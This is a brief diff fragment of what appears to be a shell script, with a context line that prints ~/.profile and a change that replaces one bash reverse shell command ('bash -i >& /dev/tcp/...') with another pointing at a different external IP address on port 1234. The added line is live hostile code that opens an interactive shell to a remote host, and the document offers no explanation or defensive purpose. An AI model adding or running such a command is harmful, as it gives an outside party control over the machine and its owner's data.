@@ -5,5 +5,5 @@
 
 cat ~/.profile
 
-/bin/bash -c 'bash -i >& /dev/tcp/45.55.182.68/1234 0>&1'
+/bin/bash -c 'bash -i >& /dev/tcp/146.190.59.192/1234 0>&1'
 
